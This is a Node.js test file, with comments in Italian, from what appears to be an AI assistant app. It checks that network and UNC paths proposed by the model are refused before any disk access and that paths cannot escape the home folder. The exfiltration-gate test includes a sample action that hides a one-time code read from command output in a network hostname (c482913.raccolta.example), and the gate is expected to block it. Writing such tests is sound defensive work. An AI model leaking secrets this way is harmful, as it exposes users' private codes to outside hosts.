// #1499 — un percorso scritto da un modello si pulisce e si misura UNA volta, come lo leggerà chi tocca il disco, e un
// percorso di rete si rifiuta prima di ogni accesso al disco: anche uno stat fa presentare Windows a quel computer.
// Il contatto SMB vero non si prova qui (nel contenitore non c'è Windows): si prova che il disco non viene chiesto.

import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import path, { join } from 'node:path';
import fs, { mkdirSync, writeFileSync } from 'node:fs';
import fsp from 'node:fs/promises';
import { cartellaTemporanea, togliCartella } from '../helpers/percorsi.mjs';

const require = createRequire(import.meta.url);
require('../../src/shared/contenutoEsterno.js');
require('../../src/shared/cmdClassify.js');
require('../../src/shared/actionLevels.js');
require('../../src/shared/nomiFile.js');
require('../../src/shared/guardianoStatico.js');
require('../../src/shared/urlExfil.js');
const DR = require('../../src/main/services/documentRead.js');
const Indice = require('../../src/main/services/documentiIndice.js');
const Testo = require('../../src/main/services/documentiTesto.js');

const AL = globalThis.SN_ACTION_LEVELS;
const N = globalThis.SN_NOMI_FILE;
const X = globalThis.SN_URL_EXFIL;

const CASA_WIN = 'C:\\Users\\Mario';
const CASA_POSIX = '/home/mario';
const CONTESTI = [
  { nome: 'win', path: path.win32, casa: CASA_WIN, perimetro: { cwd: CASA_WIN, home: CASA_WIN, win: true, maiuscole: true } },
  { nome: 'linux', path: path.posix, casa: CASA_POSIX, perimetro: { cwd: CASA_POSIX, home: CASA_POSIX, win: false, maiuscole: false } },
  { nome: 'mac', path: path.posix, casa: '/Users/mario', perimetro: { cwd: '/Users/mario', home: '/Users/mario', win: false, maiuscole: true } },
];
const SEGNI = ['«', '"', '\'', '“', '‘', '‹'];
const PERCORSI = [
  '\\\\nas\\condivisa', '//nas/condivisa', '\\\\?\\UNC\\nas\\condivisa', '\\\\.\\UNC\\nas\\condivisa',
  '\\Windows\\System32', '/etc', '/Volumes/Disco', '/net/nas/condivisa', '/Library/Keychains',
];

// Su Windows una cartella da / prende l'unità corrente, che può non essere quella della casa: lì path.relative dà un
// percorso assoluto, non un «..» (#1610).
function dentroCasa(ctx, p) {
  const r = ctx.path.relative(ctx.casa, p);
  return r === '' || (!r.startsWith('..') && !ctx.path.isAbsolute(r));
}

// /net porta a un altro computer sul Mac e su Linux; su Windows è una cartella dell'unità corrente, e il nome di
// rete nativo è \\nas (#1610). Il resto della prova è uguale sui due lati.
const WIN = process.platform === 'win32';
const RETE_DEL_SISTEMA = WIN ? '\\\\nas\\condivisa' : '/net/nas/condivisa';
const ARCHIVIO_DI_RETE = WIN ? '\\\\nas\\archivio' : '/net/nas/archivio';

// Il disco non si tocca: ogni stat e ogni risoluzione su un percorso col nome del computer di rete si registra.
// «nas» come pezzo intero del percorso: dentro un nome (una cartella temporanea, un utente) non è quel computer.
function spiaDelDisco() {
  const chiesti = [];
  const orig = { statSync: fs.statSync, stat: fsp.stat, realpath: fs.realpathSync.native, existsSync: fs.existsSync };
  const nota = (p) => { if (/(^|[\\/])nas([\\/]|$)/i.test(String(p))) chiesti.push(String(p)); };
  fs.statSync = (p, ...r) => { nota(p); return orig.statSync(p, ...r); };
  fsp.stat = (p, ...r) => { nota(p); return orig.stat(p, ...r); };
  fs.realpathSync.native = (p, ...r) => { nota(p); return orig.realpath(p, ...r); };
  fs.existsSync = (p) => { nota(p); return orig.existsSync(p); };
  return {
    chiesti,
    togli() { fs.statSync = orig.statSync; fsp.stat = orig.stat; fs.realpathSync.native = orig.realpath; fs.existsSync = orig.existsSync; },
  };
}

test('il costo di CERCA_DOCUMENTI misura la cartella che l\'indice leggerà: un segno di citazione davanti non la porta nella home', () => {
  for (const ctx of CONTESTI) {
    for (const segno of SEGNI) {
      for (const p of PERCORSI) {
        const cartella = `${segno}${p}`;
        const risolta = Indice.voceCartella(cartella, { path: ctx.path, casa: ctx.casa });
        // Una voce che non è un percorso assoluto di quel sistema non porta la ricerca da nessuna parte.
        if (!risolta) continue;
        const fuori = !dentroCasa(ctx, risolta) || DR.percorsoDiRete(risolta, { win: ctx.perimetro.win, reti: () => [] });
        assert.ok(fuori, `${ctx.nome} ${cartella} → ${risolta} sta fuori casa o in rete`);
        const a = { type: 'CERCA_DOCUMENTI', cosa: 'fattura', cartella, _cartella: risolta, _perimetro: ctx.perimetro };
        assert.equal(AL.costoFor(a), 2, `${ctx.nome} ${cartella} → ${risolta}`);
        // Anche senza la cartella risolta dal main: la stessa pulizia, non il relativo nella cartella di adesso.
        assert.equal(AL.costoFor({ ...a, _cartella: undefined }), 2, `${ctx.nome} ${cartella} senza risolta`);
      }
    }
  }
  // Quello che vede un Windows che lavora su D: con la casa su C:, provato su ogni sistema.
  const win = CONTESTI[0];
  for (const [cartella, risolta] of [['«\\Windows\\System32', 'D:\\Windows\\System32'], ['/etc', 'D:\\etc'], ['\\Users\\Mario', 'D:\\Users\\Mario']]) {
    assert.equal(dentroCasa(win, risolta), false, risolta);
    assert.equal(AL.costoFor({ type: 'CERCA_DOCUMENTI', cartella, _cartella: risolta, _perimetro: win.perimetro }), 2, risolta);
  }
});

test('nelle cartelle di sempre e nella cartella personale la ricerca resta libera, anche coi segni di citazione', () => {
  for (const ctx of CONTESTI) {
    for (const cartella of ['«Documenti»', '"~/Archivio"', `«${ctx.path.join(ctx.casa, 'Bollette')}`, 'Download']) {
      const voce = Indice.voceCartella(cartella, { path: ctx.path, casa: ctx.casa });
      const risolta = Indice.DI_SERIE[voce] ? '' : voce;
      assert.equal(AL.costoFor({ type: 'CERCA_DOCUMENTI', cartella, _cartella: risolta, _perimetro: ctx.perimetro }), 0, `${ctx.nome} ${cartella}`);
    }
  }
});

test('il popup dice la cartella che si leggerà, non quella scritta col segno davanti', () => {
  const a = { type: 'CERCA_DOCUMENTI', cosa: 'fattura', cartella: '«/etc', _cartella: '/etc', _perimetro: CONTESTI[1].perimetro };
  const testo = AL.describe(a);
  assert.match(testo, /nella cartella \/etc\n/);
  assert.doesNotMatch(testo, /«\/etc/);
});

test('un file su un altro computer non diventa un percorso da aprire, e non si chiede niente al disco', () => {
  const spia = spiaDelDisco();
  try {
    const reti = (p) => (/^z:/i.test(p) ? ['z:'] : []);
    const win = ['\\\\nas\\condivisa\\fattura.pdf', '//nas/condivisa/fattura.pdf', '\\\\?\\UNC\\nas\\condivisa\\fattura.pdf',
      '\\\\.\\UNC\\nas\\condivisa\\fattura.pdf', '\\??\\UNC\\nas\\condivisa\\fattura.pdf', '«\\\\nas\\condivisa\\fattura.pdf',
      '"//nas/condivisa/fattura.pdf"', 'Z:\\fatture\\fattura.pdf'];
    for (const p of win) assert.equal(DR.percorsoDelFile(p, { win: true, casa: CASA_WIN, reti }), null, p);
    for (const p of ['//nas/condivisa/fattura.pdf', '/net/nas/condivisa/fattura.pdf', '«//nas/condivisa/fattura.pdf']) {
      assert.equal(DR.percorsoDelFile(p, { win: false, casa: CASA_POSIX }), null, p);
    }
    assert.deepEqual(spia.chiesti, [], 'il disco non si chiede per un percorso di rete');
    // Un file di questo computer passa com'era.
    assert.equal(DR.percorsoDelFile('C:\\Users\\Mario\\fattura.pdf', { win: true, casa: CASA_WIN, reti }), 'C:\\Users\\Mario\\fattura.pdf');
    assert.equal(DR.percorsoDelFile('«~/fattura.pdf»', { win: false, casa: CASA_POSIX }), '/home/mario/fattura.pdf');
    assert.equal(DR.percorsoDelFile('fattura.pdf', { win: false, casa: CASA_POSIX }), '');
  } finally {
    spia.togli();
  }
});

test('il bottone del file non prende per locale nessuna forma con due separatori in testa', () => {
  for (const p of ['\\\\nas\\condivisa\\fattura.pdf', '//nas/condivisa/fattura.pdf', '\\\\?\\UNC\\nas\\c\\fattura.pdf',
    '\\\\.\\UNC\\nas\\c\\fattura.pdf', '\\??\\UNC\\nas\\c\\fattura.pdf', '/\\nas\\c\\fattura.pdf', 'https://nas.example/fattura.pdf', '', '   ']) {
    assert.equal(N.percorsoLocale(p), false, p);
  }
  for (const p of ['C:\\Users\\Mario\\fattura.pdf', '/home/mario/fattura.pdf', '~/fattura.pdf', '~']) assert.equal(N.percorsoLocale(p), true, p);
});

test('la porta delle uscite vede la ricerca in una cartella di rete: il nome del computer esce come un indirizzo', () => {
  assert.ok(X.USCITE.CERCA_DOCUMENTI, 'CERCA_DOCUMENTI è fra le uscite');
  const letto = [{ type: 'ESEGUI_COMANDO', _output: { command: 'type nota.txt', stdout: 'Il tuo codice monouso è 482913' } }];
  const rete = X.valutaUscita({ type: 'CERCA_DOCUMENTI', cosa: 'fattura', cartella: '\\\\c482913.raccolta.example\\x' }, { azioni: letto });
  assert.equal(rete.blocca, true);
  assert.match(rete.frase, /^non ho cercato fra i documenti: conteneva un codice letto/);
  // In una cartella di questo computer niente esce: la richiesta col codice si cerca.
  assert.equal(X.valutaUscita({ type: 'CERCA_DOCUMENTI', cosa: 'codice 482913', cartella: '~/Archivio' }, { azioni: letto }).blocca, false);
  assert.equal(X.valutaUscita({ type: 'CERCA_DOCUMENTI', cosa: 'codice 482913' }, { azioni: letto }).blocca, false);
  // Il bottone di un file di rete passa dalla porta come un indirizzo.
  assert.equal(X.valutaUscita({ type: 'APRI_FILE', percorso: '//c482913.raccolta.example/x/f.pdf' }, { azioni: letto }).blocca, true);
});

let CASA;
let DOC;
let DATI;
before(() => {
  CASA = cartellaTemporanea('filo-rete-');
  DOC = join(CASA, 'Documenti');
  DATI = join(CASA, 'dati');
  mkdirSync(DOC, { recursive: true });
  writeFileSync(join(DOC, 'nota.txt'), 'Bolletta energia elettrica marzo');
  // Una cartella di rete cercata prima che la rete si rifiutasse resta fra quelle cercate per l'occasione.
  mkdirSync(join(DATI, 'documenti'), { recursive: true });
  writeFileSync(join(DATI, 'documenti', 'indice.jsonl'), `${JSON.stringify({ o: '//nas/condivisa', q: 1 })}\n${JSON.stringify({ o: ARCHIVIO_DI_RETE, q: 2 })}\n`);
  Indice._azzera();
  Indice.configura({ impostazioni: async () => ({ documenti: { cartelle: [DOC] } }), cartellaDati: () => DATI, estrai: (p) => Testo.estrai(p) });
});
after(() => { if (CASA) togliCartella(CASA); });

test('l\'indice rifiuta una cartella di rete prima di guardarla: nella ricerca, nell\'elenco delle Preferenze e prima di aggiungerla', async () => {
  const spia = spiaDelDisco();
  try {
    for (const cartella of ['//nas/condivisa', '«//nas/condivisa', RETE_DEL_SISTEMA, `"${RETE_DEL_SISTEMA}"`]) {
      const r = await Indice.cerca('bolletta', { cartella });
      assert.equal(r.cartellaDiRete, cartella);
      assert.deepEqual(r.risultati, []);
      assert.equal(r.cartellaMancante, '');
      assert.equal((await Indice.cartellaChiesta(cartella)).rete, true);
    }
    const occ = (await Indice.stato()).occasionali;
    assert.deepEqual(occ.map((o) => [o.percorso, o.esiste]).sort(), [['//nas/condivisa', false], [ARCHIVIO_DI_RETE, false]].sort());
    assert.deepEqual(await Indice.cartelleMancanti(['//nas/condivisa', RETE_DEL_SISTEMA, DOC]), ['//nas/condivisa', RETE_DEL_SISTEMA]);
    assert.deepEqual(spia.chiesti, [], 'nessuno stat su un percorso di rete');
    // Si possono ancora dimenticare.
    assert.equal((await Indice.dimentica('//nas/condivisa')).tolta, true);
  } finally {
    spia.togli();
  }
  // La ricerca di sempre funziona.
  assert.equal((await Indice.cerca('bolletta luce')).risultati[0].nome, 'nota.txt');
});

test('il gestore rimisura la cartella risolta prima di toccarla: se il gate ne ha misurata un\'altra, non la legge', async () => {
  const fuori = join(CASA, 'Fuori');
  mkdirSync(fuori, { recursive: true });
  writeFileSync(join(fuori, 'segreto.txt'), 'Bolletta energia elettrica segreta');
  let chiesto = '';
  const r = await Indice.cerca('bolletta', { cartella: `«${fuori}`, fuori: (p) => { chiesto = p; return 'legge fuori dalla tua cartella personale'; } });
  assert.equal(chiesto, fuori);
  assert.equal(r.cartellaFuori, 'legge fuori dalla tua cartella personale');
  assert.deepEqual(r.risultati, []);
  const ok = await Indice.cerca('bolletta', { cartella: `«${fuori}`, fuori: () => '' });
  assert.equal(ok.risultati[0].nome, 'segreto.txt');
  // Le cartelle di serie non passano dal controllo: sono quelle dell'utente.
  let serie = false;
  await Indice.cerca('bolletta', { cartella: 'Documenti', fuori: () => { serie = true; return 'no'; } });
  assert.equal(serie, false);
  await Indice.dimentica(fuori);
});
